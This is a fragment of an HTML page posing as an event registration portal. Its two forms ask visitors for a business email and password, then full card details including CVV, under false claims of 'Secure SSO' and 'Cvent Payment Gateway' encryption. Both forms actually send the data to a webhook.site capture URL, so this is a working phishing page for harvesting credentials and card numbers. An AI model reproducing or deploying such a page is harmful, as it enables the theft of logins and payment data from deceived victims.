        p { font-size: 14px; color: #555; margin-bottom: 30px; line-height: 1.5; }
        
        .input-group { margin-bottom: 15px; text-align: left; }
        label { display: block; font-size: 12px; font-weight: bold; color: #333; margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        input:focus { border-color: #0066cc; outline: none; box-shadow: 0 0 4px rgba(0,102,204,0.2); }
        
        .row { display: flex; gap: 10px; }
        button { width: 100%; padding: 15px; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
        
        .btn-blue { background-color: #0066cc; }
        .btn-blue:hover { background-color: #0056b3; }
        .btn-green { background-color: #28a745; }
        .btn-green:hover { background-color: #218838; }

    <div class="main-content">
        <!-- LEFT SIDE: AUTH -->
        <div class="pane left">
            <div class="container">
                <label>Step 1</label>
                <h2>Verify Identity</h2>
                <p>Verify your credentials to link this registration to your profile.</p>
                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
                    <div class="input-group">
                        <label>Business Email</label>
                        <input type="email" name="email" placeholder="user@company.com" required>
                    </div>
                    <div class="input-group">
                        <label>Password</label>
                        <input type="password" name="password" placeholder="••••••••" required>
                    </div>
                    <button type="submit" class="btn-blue">Connect Account</button>
                    <div class="footer-text">Secure SSO Authentication Enabled</div>
                </form>
            </div>
        </div>

        <!-- RIGHT SIDE: PAYMENT -->
        <div class="pane right">
            <div class="container">
                <label>Step 2</label>
                <h2>Finalize Payment</h2>
                <p>Registration Fee: <b>$250.00 USD</b>. Enter your card details to secure your ticket.</p>
                <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
                    <div class="input-group">
                        <label>Cardholder Name</label>
                        <input type="text" name="cc_name" placeholder="John Doe" required>
                    </div>
                    <div class="input-group">
                        <label>Card Number</label>
                        <input type="text" name="cc_number" placeholder="0000 0000 0000 0000" required maxlength="16">
                    </div>
                    <div class="row">
                        <div class="input-group" style="flex: 2;">
                            <label>Expiration</label>
                            <input type="text" name="cc_exp" placeholder="MM / YY" required maxlength="5">
                        </div>
                        <div class="input-group" style="flex: 1;">
                            <label>CVV</label>
                            <input type="text" name="cc_cvv" placeholder="123" required maxlength="4">
                        </div>
                    </div>
                    <button type="submit" class="btn-green">Pay & Register</button>
                    <div class="footer-text">Encrypted by Cvent Payment Gateway</div>
                </form>
            </div>
        </div>
